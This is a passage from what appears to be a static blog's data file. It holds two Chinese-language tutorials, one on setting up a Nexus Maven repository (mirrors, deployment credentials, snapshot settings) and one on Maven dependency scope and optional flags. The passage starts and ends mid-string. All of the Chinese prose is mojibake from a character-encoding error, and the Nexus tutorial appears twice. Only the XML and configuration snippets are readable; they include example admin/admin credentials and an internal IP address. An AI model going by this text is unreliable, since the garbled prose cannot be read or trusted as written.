run_as_root=trueï¼æ¹ä¸ºå¦ä¸\nrun_as_root=false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå¯å¨æååå°±å¯ä»¥ç»å½ nexus ææä¾çå®¢æ·ç«¯çé¢ï¼ç»å½çæ¶åä¼é®ä½ è¦è´¦å·å¯ç ï¼è´¦å·é»è®¤æ¯ adminï¼å¯ç å¨ /opt/software/nexus3/sonatype-work/nexus3/admin.password æä»¶ä¸­ï¼ç»å½æååä¼è¦æ±æ´æ¹å¯ç ï¼å¯ç æ´æ¹å admin.password ä¼èªå¨å é¤ãä¿®æ¹ä¼ä¼è®©ä½ éæ©ä¸¥æ ¼æ¨¡å¼ï¼å»ºè®®åè®¸ææäººè®¿é®ï¼æ¯ç«æ¯ç§ææ²¡å¤ªå¤§å¿è¦ä¸¥æ ¼ã\n\n\n\n\n\n\n\nç¹å»è®¾ç½®ãç¹å»ä»åºï¼æä»¬å¯ä»¥çå°ä»åºç®¡çéç½®åè¡¨ï¼å¶ä¸­è· Maven ç¸å³çæ 4 ä¸ªï¼Maven ç¸å¯¹æ 3 ä¸ª Type\n\n * proxyï¼è¡¨ç¤ºä¸ºä»£çä»åºï¼ä¸è½½ç»ä»¶æ¶ï¼å¦æä»£çä»åºæç´¢ä¸å°ï¼åæè¯·æ±è½¬åå°è¿ç¨ä»åºï¼é»è®¤ https://repo1.maven.org/maven2/ï¼è¯¥å°åå¯ä»¥ä¿®æ¹ï¼ï¼å¹¶ä»è¿ç¨ä»åºä¸è½½ï¼ç¶åå°è¯¥ç»ä»¶ç¼å­å°ä»£çåºï¼å½åæ¬¡è¯·æ±è¯¥ç»ä»¶æ¶ï¼åç´æ¥å°ä»£çä»åºä¸è½½ï¼ä¸ä¼åä»è¿ç¨ä»åºä¸è½½ã\n * hosted\n   è¡¨ç¤ºå®¿ä¸»ä»åºï¼ä¸»è¦ç¨æ¥é¨ç½²å¢éåé¨ç»ä»¶ï¼å¶ä¸­ maven-releases ç¨æ¥é¨ç½²å¢éåé¨çåå¸çç»ä»¶ï¼maven-snapshots ç¨æ¥é¨ç½²å¢éåé¨çå¿«ç§çç»ä»¶ã\n * group\n   è¡¨ç¤ºåç»ä»åºï¼é»è®¤å° maven-centralãmaven-releasesãmaven-snapshots ä¸ä¸ªä»åºç»åå¨ä¸èµ·å¯¹å¤æä¾æå¡ï¼ç®åäº maven å®¢æ·ç«¯å¨ setting.xml æ pom.xml çéç½®\n\nä¿®æ¹ maven-central ç proxy å°åï¼ä½ å¯ä»¥å¨åè¡¨ä¸­ç¹å» maven-centralï¼å°±ä¼è¿å° maven-central çç¼è¾é¡µï¼ç¶åå¨ Remote storage ä¿®æ¹ä¸ºé¿éäºçä»åºç¹å»ä¿å­å³å¯ã\n\nhttps://maven.aliyun.com/nexus/content/groups/public/\n\n\n1\n\n\n\n\nmaven æ³ä½¿ç¨æä»¬èªå·±æ­å»ºç nexusï¼åªéè¦å¨ maven-3.8.4\\conf\\settings.xml æä»¶ä¿®æ¹éåå°åå³å¯\n\n  <mirrors>\n\t\x3c!-- é¿éäº --\x3e\n\t\x3c!--\n    <mirror>\n      <id>alimaven</id>\n      <name>aliyun maven</name>\n      <url>https://maven.aliyun.com/nexus/content/groups/public/</url>\n      <mirrorOf>central</mirrorOf>\n    </mirror>\n\t--\x3e\n    <mirror>\n      <id>nexus</id>\n      <mirrorOf>*</mirrorOf>\n      <url>http://10.240.30.93:9527/repository/maven-public/</url>\n    </mirror>\n  </mirrors>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n> æç§ä»¥ä¸çæä½ï¼æä»¬åªæ°å¯å¨ä¸ä¸ªé¡¹ç®ï¼å¹¶å¨é¡¹ç®ä¸­æå®è¯¥ mavenï¼æ­¤æ¶æä»¬ä¸è½½ç jar å°±ä¼ç¼å­å° nexus éï¼å½å¶ä»åäºä½¿ç¨è¯¥é¡¹ç®å°±ä¼åç°è¯¥é¡¹ç®çä¾èµä¸è½½ä¸ºæä»¬ nexus çé¨ç½²å°åã\n\nä½æ¯è¿è¿ä¸å¤ï¼å¨å®éå¼åä¸­ï¼é¤äºæä»¬æ¬èº«ä½¿ç¨çç¬¬ä¸æ¹ä¾èµå¤ï¼æä»¬èªå·±ä¹ä¼åä¸äºä¾èµåæå·¥å·åç­ï¼æ­¤æ¶è¥æ³è®©å¶ä»åäºå¯ä»¥ä¸è½½å¹¶ä¾èµä½¿ç¨ï¼æä»¬å°±éè¦ææä»¬å¶ä½ç jar åå¸å° nexus éå»ãæä»¬åè¦å¨æä»¬ç maven ç settings.xml ä¸­éç½®å¨ nexus çè´¦å·å¯ç \n\n  <servers>\n    <server>\n      \x3c!-- æ³¨æid  nexus--\x3e\n      <id>nexus</id>\n      <username>admin</username>\n      <password>admin</password>\n    </server>\t\n  </servers>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nä¹åæä»¬åªéè¦åå»ºæä»¬ç jar å¹¶æ·»å ä¸äºéç½®å³å¯ï¼ç¸åºéç½®å¨ä»£ç ä¸­æè¯´æ\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>org.example</groupId>\n    <artifactId>demoJar</artifactId>\n    \x3c!-- åç¼ SNAPSHOT å°±ä¼æ jar åå¸å° nexus repositoryç maven-snapshots --\x3e\n    <version>1.0-SNAPSHOT</version>\n\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n    </properties>\n\n    \x3c!-- éç½® nexus --\x3e\n    <distributionManagement>\n        <repository>\n            \x3c!-- è¿éçidéçº¦ setting.xml éç½®çidç¸å --\x3e\n            <id>nexus</id>\n            \x3c!-- éç½®åå¸ççåç§°ä¸è·¯å¾ --\x3e\n            <name>Nexus Release Repository</name>\n            <url>>http://10.240.30.93:9527/repository/maven-releases/</url>\n        </repository>\n        <snapshotRepository>\n            <id>nexus</id>\n            <name>Nexus Snapshot Repository</name>\n            <url>http://10.240.30.93:9527/repository/maven-snapshots/</url>\n        </snapshotRepository>\n    </distributionManagement>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\néç½®å®æåï¼åå¥½çä½ çå·¥å·ç±»ï¼ç¶åå¯¹å¶è¿è¡ maven åçåå¸\n\n\n\n\n\n\n\nç¶åè®©ä½ çåäºè¿è¡ä¾èµå¼å¥ï¼å°±å¯ä»¥è°ç¨ä½ çæ¹æ³äºã\n\n        <dependency>\n            <groupId>org.example</groupId>\n            <artifactId>demoJar</artifactId>\n            <version>1.0-SNAPSHOT</version>\n        </dependency>\n\n\n1\n2\n3\n4\n5\n\n\n> ç¸åçæ¬ç jar é»è®¤æ¯ä¸è½éå¤åå¸å° nexus ä¸­çï¼å¯ä»¥ä¿®æ¹ä½ è¦åå¸å°åçéç½®ï¼æ¹ä¸º Allow redeploy\n\n\n\n> å¦æåç°èªå·±ä¸ä¼ çåï¼ç¡®å®æ è¯¯åæ æ³ä¸è½½ä¾èµï¼ä¸ç®¡æ¯èªå·±è¿æ¯å«äººï¼é£ä¹å¯è½åå æ¯ Maven åç½®çæä»¶è¿ç¨ä»åºéç½®ï¼å³é­äºå¯¹ SNAPSHOT çæ¯æï¼é²æ­¢ä¸ç¨³å®çæå»ºãæä»¥è§£å³åæ³æå³é®çæ¯ï¼å¨ maven ç conf ç®å½ä¸ç setting.xml æä»¶ä¸­ï¼æ·»å  å¯¹ SNAPSHOT çæ¯æ\n\n<snapshots>\nãã<enabled>true</enabled>\n</snapshots>\n\n\n1\n2\n3\n\n\nå¨ä½  maven setting.xml éå ï¼æè pom.xml éå é½è¡\n\n    <profiles>\n        <profile>\n            <id>central-repo</id>\n            <repositories>\n                <repository>\n                    <id>central</id>\n                    <name>Central-repo</name>\n                    <url>http://******/central</url>\n                    <releases>\n                        <enabled>true</enabled>\n                    </releases>\n                    <snapshots>\n                        <enabled>true</enabled>\n                    </snapshots>\n                </repository>\n            </repositories>\n        </profile>\n    </profiles>\n \n    <activeProfiles>\n        <activeProfile>central-repo</activeProfile>\n    </activeProfiles>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nå¦æéè¦æ·»å ä¸¤ä¸ªå¯ä»¥æ¯\n\n    <profile>\n        <repositories>\n            <repository>\n                <releases>\n                    <enabled>true</enabled>\n                </releases>\n                <snapshots>\n                    <enabled>false</enabled>\n                </snapshots>\n                <id>releases</id>\n                <name>release</name>\n                <url>http://***********/maven-releases/</url>\n            </repository>\n            <repository>\n                <releases>\n                    <enabled>false</enabled>\n                </releases>\n                <snapshots>\n                    <enabled>true</enabled>\n                </snapshots>\n                <id>snapshots</id>\n                <name>libs-snapshot</name>\n                <url>http://***************/maven-snapshots/</url>\n            </repository>\n        </repositories>\n        <id>artifactory</id>\n    </profile>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n',normalizedContent:'ä¸è½½å°å https://help.sonatype.com/repomanager3/product-information/downloadï¼ä¸è½½å¥½åè¿è¡è§£åç¼©ä¼å¾å°ä¸¤ä¸ªæä»¶ï¼nexus-3.39.0-01 å sonatype-workãå¯ä»¥éç½® nexus åéå°æä»¬çç¯å¢ä¸­æ¹ä¾¿å¯å¨ï¼ä¹å¯ä»¥ä¸éç½®æ¯æ¬¡é½å° nexus-3.39.0-01/bin ä¸å»å¯å¨ã\n\nnexus_home: /opt/software/nexus3/nexus-3.39.0-01/\npath: %nexus_home%/bin\n\n\n1\n2\n\n\nnexus é»è®¤ä½¿ç¨çæ¯ 8081 ç«¯å£ï¼å¾å¤å¾®æå¡çç«¯å£é½ä¼ä» 8080 ç­å¼å§ä½¿ç¨ï¼å¯ä»¥ä¿®æ¹ nexus çç«¯å£ï¼å·ä½ä½ç½®æä»¶ä¸º /opt/software/nexus3/nexus-3.39.0-01/etc/nexus-default.properties\n\nå¯å¨ nexus å½ä»¤\n\n./nexus {start|stop|run|run-redirect|status|restart|force-reload}\n\n# æç¤ºä¿¡æ¯\nwarning: ************************************************************\nwarning: detected execution as "root" user.  this is not recommended!\nwarning: ************************************************************\n\n# è¿ä¸ªä¿¡æ¯éè¦ä¿®æ¹ /opt/software/nexus3/nexus-3.39.0-01/bin/nexus æä»¶ï¼æ¾å° run_as_root=trueï¼æ¹ä¸ºå¦ä¸\nrun_as_root=false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå¯å¨æååå°±å¯ä»¥ç»å½ nexus ææä¾çå®¢æ·ç«¯çé¢ï¼ç»å½çæ¶åä¼é®ä½ è¦è´¦å·å¯ç ï¼è´¦å·é»è®¤æ¯ adminï¼å¯ç å¨ /opt/software/nexus3/sonatype-work/nexus3/admin.password æä»¶ä¸­ï¼ç»å½æååä¼è¦æ±æ´æ¹å¯ç ï¼å¯ç æ´æ¹å admin.password ä¼èªå¨å é¤ãä¿®æ¹ä¼ä¼è®©ä½ éæ©ä¸¥æ ¼æ¨¡å¼ï¼å»ºè®®åè®¸ææäººè®¿é®ï¼æ¯ç«æ¯ç§ææ²¡å¤ªå¤§å¿è¦ä¸¥æ ¼ã\n\n\n\n\n\n\n\nç¹å»è®¾ç½®ãç¹å»ä»åºï¼æä»¬å¯ä»¥çå°ä»åºç®¡çéç½®åè¡¨ï¼å¶ä¸­è· maven ç¸å³çæ 4 ä¸ªï¼maven ç¸å¯¹æ 3 ä¸ª type\n\n * proxyï¼è¡¨ç¤ºä¸ºä»£çä»åºï¼ä¸è½½ç»ä»¶æ¶ï¼å¦æä»£çä»åºæç´¢ä¸å°ï¼åæè¯·æ±è½¬åå°è¿ç¨ä»åºï¼é»è®¤ https://repo1.maven.org/maven2/ï¼è¯¥å°åå¯ä»¥ä¿®æ¹ï¼ï¼å¹¶ä»è¿ç¨ä»åºä¸è½½ï¼ç¶åå°è¯¥ç»ä»¶ç¼å­å°ä»£çåºï¼å½åæ¬¡è¯·æ±è¯¥ç»ä»¶æ¶ï¼åç´æ¥å°ä»£çä»åºä¸è½½ï¼ä¸ä¼åä»è¿ç¨ä»åºä¸è½½ã\n * hosted\n   è¡¨ç¤ºå®¿ä¸»ä»åºï¼ä¸»è¦ç¨æ¥é¨ç½²å¢éåé¨ç»ä»¶ï¼å¶ä¸­ maven-releases ç¨æ¥é¨ç½²å¢éåé¨çåå¸çç»ä»¶ï¼maven-snapshots ç¨æ¥é¨ç½²å¢éåé¨çå¿«ç§çç»ä»¶ã\n * group\n   è¡¨ç¤ºåç»ä»åºï¼é»è®¤å° maven-centralãmaven-releasesãmaven-snapshots ä¸ä¸ªä»åºç»åå¨ä¸èµ·å¯¹å¤æä¾æå¡ï¼ç®åäº maven å®¢æ·ç«¯å¨ setting.xml æ pom.xml çéç½®\n\nä¿®æ¹ maven-central ç proxy å°åï¼ä½ å¯ä»¥å¨åè¡¨ä¸­ç¹å» maven-centralï¼å°±ä¼è¿å° maven-central çç¼è¾é¡µï¼ç¶åå¨ remote storage ä¿®æ¹ä¸ºé¿éäºçä»åºç¹å»ä¿å­å³å¯ã\n\nhttps://maven.aliyun.com/nexus/content/groups/public/\n\n\n1\n\n\n\n\nmaven æ³ä½¿ç¨æä»¬èªå·±æ­å»ºç nexusï¼åªéè¦å¨ maven-3.8.4\\conf\\settings.xml æä»¶ä¿®æ¹éåå°åå³å¯\n\n  <mirrors>\n\t\x3c!-- é¿éäº --\x3e\n\t\x3c!--\n    <mirror>\n      <id>alimaven</id>\n      <name>aliyun maven</name>\n      <url>https://maven.aliyun.com/nexus/content/groups/public/</url>\n      <mirrorof>central</mirrorof>\n    </mirror>\n\t--\x3e\n    <mirror>\n      <id>nexus</id>\n      <mirrorof>*</mirrorof>\n      <url>http://10.240.30.93:9527/repository/maven-public/</url>\n    </mirror>\n  </mirrors>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n> æç§ä»¥ä¸çæä½ï¼æä»¬åªæ°å¯å¨ä¸ä¸ªé¡¹ç®ï¼å¹¶å¨é¡¹ç®ä¸­æå®è¯¥ mavenï¼æ­¤æ¶æä»¬ä¸è½½ç jar å°±ä¼ç¼å­å° nexus éï¼å½å¶ä»åäºä½¿ç¨è¯¥é¡¹ç®å°±ä¼åç°è¯¥é¡¹ç®çä¾èµä¸è½½ä¸ºæä»¬ nexus çé¨ç½²å°åã\n\nä½æ¯è¿è¿ä¸å¤ï¼å¨å®éå¼åä¸­ï¼é¤äºæä»¬æ¬èº«ä½¿ç¨çç¬¬ä¸æ¹ä¾èµå¤ï¼æä»¬èªå·±ä¹ä¼åä¸äºä¾èµåæå·¥å·åç­ï¼æ­¤æ¶è¥æ³è®©å¶ä»åäºå¯ä»¥ä¸è½½å¹¶ä¾èµä½¿ç¨ï¼æä»¬å°±éè¦ææä»¬å¶ä½ç jar åå¸å° nexus éå»ãæä»¬åè¦å¨æä»¬ç maven ç settings.xml ä¸­éç½®å¨ nexus çè´¦å·å¯ç \n\n  <servers>\n    <server>\n      \x3c!-- æ³¨æid  nexus--\x3e\n      <id>nexus</id>\n      <username>admin</username>\n      <password>admin</password>\n    </server>\t\n  </servers>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nä¹åæä»¬åªéè¦åå»ºæä»¬ç jar å¹¶æ·»å ä¸äºéç½®å³å¯ï¼ç¸åºéç½®å¨ä»£ç ä¸­æè¯´æ\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n\n    <groupid>org.example</groupid>\n    <artifactid>demojar</artifactid>\n    \x3c!-- åç¼ snapshot å°±ä¼æ jar åå¸å° nexus repositoryç maven-snapshots --\x3e\n    <version>1.0-snapshot</version>\n\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n    </properties>\n\n    \x3c!-- éç½® nexus --\x3e\n    <distributionmanagement>\n        <repository>\n            \x3c!-- è¿éçidéçº¦ setting.xml éç½®çidç¸å --\x3e\n            <id>nexus</id>\n            \x3c!-- éç½®åå¸ççåç§°ä¸è·¯å¾ --\x3e\n            <name>nexus release repository</name>\n            <url>>http://10.240.30.93:9527/repository/maven-releases/</url>\n        </repository>\n        <snapshotrepository>\n            <id>nexus</id>\n            <name>nexus snapshot repository</name>\n            <url>http://10.240.30.93:9527/repository/maven-snapshots/</url>\n        </snapshotrepository>\n    </distributionmanagement>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\néç½®å®æåï¼åå¥½çä½ çå·¥å·ç±»ï¼ç¶åå¯¹å¶è¿è¡ maven åçåå¸\n\n\n\n\n\n\n\nç¶åè®©ä½ çåäºè¿è¡ä¾èµå¼å¥ï¼å°±å¯ä»¥è°ç¨ä½ çæ¹æ³äºã\n\n        <dependency>\n            <groupid>org.example</groupid>\n            <artifactid>demojar</artifactid>\n            <version>1.0-snapshot</version>\n        </dependency>\n\n\n1\n2\n3\n4\n5\n\n\n> ç¸åçæ¬ç jar é»è®¤æ¯ä¸è½éå¤åå¸å° nexus ä¸­çï¼å¯ä»¥ä¿®æ¹ä½ è¦åå¸å°åçéç½®ï¼æ¹ä¸º allow redeploy\n\n\n\n> å¦æåç°èªå·±ä¸ä¼ çåï¼ç¡®å®æ è¯¯åæ æ³ä¸è½½ä¾èµï¼ä¸ç®¡æ¯èªå·±è¿æ¯å«äººï¼é£ä¹å¯è½åå æ¯ maven åç½®çæä»¶è¿ç¨ä»åºéç½®ï¼å³é­äºå¯¹ snapshot çæ¯æï¼é²æ­¢ä¸ç¨³å®çæå»ºãæä»¥è§£å³åæ³æå³é®çæ¯ï¼å¨ maven ç conf ç®å½ä¸ç setting.xml æä»¶ä¸­ï¼æ·»å  å¯¹ snapshot çæ¯æ\n\n<snapshots>\nãã<enabled>true</enabled>\n</snapshots>\n\n\n1\n2\n3\n\n\nå¨ä½  maven setting.xml éå ï¼æè pom.xml éå é½è¡\n\n    <profiles>\n        <profile>\n            <id>central-repo</id>\n            <repositories>\n                <repository>\n                    <id>central</id>\n                    <name>central-repo</name>\n                    <url>http://******/central</url>\n                    <releases>\n                        <enabled>true</enabled>\n                    </releases>\n                    <snapshots>\n                        <enabled>true</enabled>\n                    </snapshots>\n                </repository>\n            </repositories>\n        </profile>\n    </profiles>\n \n    <activeprofiles>\n        <activeprofile>central-repo</activeprofile>\n    </activeprofiles>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nå¦æéè¦æ·»å ä¸¤ä¸ªå¯ä»¥æ¯\n\n    <profile>\n        <repositories>\n            <repository>\n                <releases>\n                    <enabled>true</enabled>\n                </releases>\n                <snapshots>\n                    <enabled>false</enabled>\n                </snapshots>\n                <id>releases</id>\n                <name>release</name>\n                <url>http://***********/maven-releases/</url>\n            </repository>\n            <repository>\n                <releases>\n                    <enabled>false</enabled>\n                </releases>\n                <snapshots>\n                    <enabled>true</enabled>\n                </snapshots>\n                <id>snapshots</id>\n                <name>libs-snapshot</name>\n                <url>http://***************/maven-snapshots/</url>\n            </repository>\n        </repositories>\n        <id>artifactory</id>\n    </profile>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n',charsets:{cjk:!0}},{title:"dependencies æ ç­¾è¯¦è§£",frontmatter:{title:"dependencies æ ç­¾è¯¦è§£",date:"2023-06-25T09:22:36.000Z",permalink:"/maven/2301/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/2300.maven/2301.dependencies%20%E6%A0%87%E7%AD%BE%E8%AF%A6%E8%A7%A3.html",relativePath:"00.java/2300.maven/2301.dependencies æ ç­¾è¯¦è§£.md",key:"v-13c2056a",path:"/maven/2301/",headers:[{level:2,title:"scop",slug:"scop",normalizedTitle:"scop",charIndex:320},{level:2,title:"optional",slug:"optional",normalizedTitle:"optional",charIndex:3888},{level:2,title:"exclusions",slug:"exclusions",normalizedTitle:"exclusions",charIndex:4485}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"scop optional exclusions",content:'dependencies æ ç­¾ä¸åªä¼æä¸ä¸ª dependencyï¼dependency ä½ç¨äºæä»¬å¼ç¨åªäº jar æ¥ç»æä»¬æä¾æ´å¤çææ¯æ¯æãä¸è¬ç¨æ³:\n\n    <dependencies>\n        <dependency>\n            <groupId>org.apache.commons</groupId>\n            <artifactId>commons-pool2</artifactId>\n            <version>2.7.0</version>\n        </dependency>\n    </dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# scop\n\næ§å¶ dependency (ä¾èµ) çä½¿ç¨èå´ãéä¿çè®²ï¼å°±æ¯æ§å¶ Jar åå¨åªäºèå´è¢«å è½½åä½¿ç¨ãä½¿ç¨æ¹å¼å¦ä¸ï¼\n\n<dependency>\n    <groupId>com.giant</groupId>\n    <artifactId>giant-core-security</artifactId>\n    <version>1.0-SNAPSHOT</version>\n    <scope>compile</scope>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n\n\nscop ä¸å±æ 6 ä¸ªå¼å¯ä»¥ä½¿ç¨ï¼\n\n * compileï¼é»è®¤å¼ï¼\n   å¦ææ²¡ææå® scope å¼ï¼è¯¥åç´ çé»è®¤å¼ä¸º compileãè¢«ä¾èµï¼giant-core-securitï¼jar éè¦åä¸å°å½åé¡¹ç®çç¼è¯ï¼æµè¯ï¼æåï¼è¿è¡ç­é¶æ®µãæåçæ¶åéå¸¸ä¼åå«è¢«ä¾èµï¼giant-core-securitï¼jarã\n\n * provided\n   è¢«ä¾èµ jar çè®ºä¸å¯ä»¥åä¸ç¼è¯ãæµè¯ãè¿è¡ç­é¶æ®µï¼ç¸å½äº compileï¼ä½æ¯å¨æåé¶æ®µåäº excludeï¼æé¤ï¼ çå¨ä½ãä¾å¦ï¼ å¦ææä»¬å¨å¼åä¸ä¸ªåºç¨ï¼å¨ç¼è¯æ¶æä»¬éè¦ä¾èµ xxxx.jarï¼ä½æ¯å¨è¿è¡æ¶æä»¬ä¸éè¦è¯¥ jar åï¼å ä¸ºè¿ä¸ª jar åå·²ç±åºç¨æå¡å¨æé¡¹ç®æ¬èº«æä¾è¯¥ä¾èµï¼æ­¤æ¶æä»¬éè¦ä½¿ç¨ provided è¿è¡èå´ä¿®é¥°ã\n\n * runtime\n   è¡¨ç¤ºè¢«ä¾èµ jar æ éåä¸é¡¹ç®çç¼è¯é¶æ®µï¼ä½æ¯ä¼åä¸å°é¡¹ç®çæµè¯åè¿è¡é¶æ®µãä¸ compile ç¸æ¯ï¼è¢«ä¾èµ jar æ éåä¸é¡¹ç®çç¼è¯ãéç¨åºæ¯ï¼ä¾å¦ï¼å¨ç¼è¯çæ¶åæä»¬ä¸éè¦ JDBC API ç jar åï¼èå¨è¿è¡çæ¶åæä»¬æéè¦ JDBC é©±å¨åã\n\n * test\n   è¡¨ç¤ºè¢«ä¾èµé¡¹ç®ä»ä»åä¸æµè¯ç¸å³çå·¥ä½ï¼åæ¬æµè¯ä»£ç çç¼è¯ï¼æ§è¡ãéç¨åºæ¯ï¼ä¾å¦ï¼Junit æµè¯ã\n\n * system\n   system åç´ ä¸ provided åç´ ç±»ä¼¼ï¼ä½æ¯è¢«ä¾èµ jar ä¸ä¼ä» maven ä»åºä¸­æ¥æ¾ï¼èæ¯ä»æ¬å°ç³»ç»ä¸­è·åï¼systemPath åç´ ç¨äºå¶å®æ¬å°ç³»ç»ä¸­ jar æä»¶çè·¯å¾ãä¾å¦ï¼\n\n<dependency>\n    <groupId>sleepycat</groupId>\n    <artifactId>je</artifactId>\n    <version>7.0.6</version>\n    <scope>system</scope>\n    <systemPath>${project.basedir}/lib/je-7.0.6.jar</systemPath>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n * import\n   å®åªä½¿ç¨å¨ <dependencyManagement> ä¸­ï¼è¡¨ç¤ºä»å¶å®ç pom ä¸­å¯¼å¥ dependency çéç½®ï¼ä¾å¦ï¼B é¡¹ç®å¯¼å¥ A é¡¹ç®ä¸­çåéç½®ï¼ãä¼æå¨ç¥ï¼å½æä»¬åå»ºä¸ä¸ª SpringBoot é¡¹ç®æ¶ï¼æä»¬ä¸å®ä¼åä¸ä¸ª <parent> æ¥ç»§æ¿ spring ææä¾çææä¾èµï¼ä½å¦ææåæ³ä½¿ç¨ spring æä¾çä¾èµï¼åæ³ç»§æ¿æèªå·±çé¡¹ç®ï¼æ­¤æ¶ import å°±æäºç¨æ­¦ä¹å°\n\n# æ®é SpringBoot ä¾èµ\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>2.2.6.RELEASE</version>\n        <relativePath/>\n    </parent>\n\n    <groupId>com.giant</groupId>\n    <artifactId>station</artifactId>\n    <version>${project-version}</version>\n    <packaging>pom</packaging>\n\n    <properties>\n        <project-version>1.0.0</project-version>\n    </properties>\n\n</project>\n\n## æ´æ¢ç»§æ¿é¡¹ç®ï¼å¹¶ä½¿ç¨springboot ä¾èµ\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n\n    \x3c!-- åä¸ºæèªå·±çç¶é¡¹ç® --\x3e\n    <parent>\n        <groupId>com.giant.parent</groupId>\n        <artifactId>boot-parent</artifactId>\n        <version>1.0-SNAPSHOT</version>\n        <relativePath/>\n    </parent>\n\n    <groupId>com.giant</groupId>\n    <artifactId>station</artifactId>\n    <version>${project-version}</version>\n    <packaging>pom</packaging>\n\n    <properties>\n        <project-version>1.0.0</project-version>\n    </properties>\n\n    \x3c!-- spring boot ä¾èµ --\x3e\n    <dependencyManagement>\n        <dependencies>\n            <dependency>\n                <groupId>org.springframework.boot</groupId>\n                <artifactId>spring-boot-starter-parent</artifactId>\n                <version>2.2.6.RELEASE</version>\n                \x3c!-- éè¦æææ¶pomè¿æ¯jar --\x3e\n                <type>pom</type>\n                <scope>import</scope>\n            </dependency>\n        </dependencies>\n    </dependencyManagement>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\n\n# optional\n\noptional æ¯ maven ä¾èµ jar æ¶çä¸ä¸ªéé¡¹ï¼è¡¨ç¤ºè¯¥ä¾èµæ¯å¯éçï¼ä¸ä¼è¢«ä¾èµä¼ éãä¾å¦ï¼B ä¾èµäºæ¥å¿æ¡æ¶ logbackãlog4jãapache commons logï¼è¿æ¶å A å¼ç¨ B ç jarï¼å ä¸º maven æä¾èµä¼ éæºå¶ï¼é£ä¹ A é¡¹ç®å°±ä¼æ 3 ä¸ª jar åï¼logbackãlog4jãapache commons logãå®éä¸æä»¬ä¸è¬åªä¼å¨é¡¹ç®ä¸­ä½¿ç¨ä¸ç§æ¥å¿æ¡æ¶ï¼é£ä¹æä»¬é¡¹ç®ä¸­å°±ä¼æå¤ä½çä¾èµï¼å½è¿ç§æåµæ¶è¶æ¥è¶å¤æ¶ï¼æåæ´ä¸ªé¡¹ç®ç jar åå°±æå¾å¤çå¤ä½ä¾èµï¼å¯¼è´é¡¹ç®å¾èè¿ã\n\nå¯¹äºè¿ç§æåµï¼æä»¬åªè¦å¨ B é¡¹ç®ä¸­æ logbackãlog4jãapache commons log è®¾ç½®æ <optional>true</optional> çå³å¯ãè¿æ¶å A é¡¹ç®ä¾èµ B çæ¶åï¼é¡¹ç®ä¸­ä¸ä¼æ logbackãlog4jãapache commons log ç¸å³ jar åï¼å¯ä»¥æ ¹æ®æåµèªè¡éæ©ä¸ä¸ªå³å¯ã\n\n<dependency>\n    <groupId>org.projectlombok</groupId>\n    <artifactId>lombok</artifactId>\n    <optional>true</optional>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n\n# 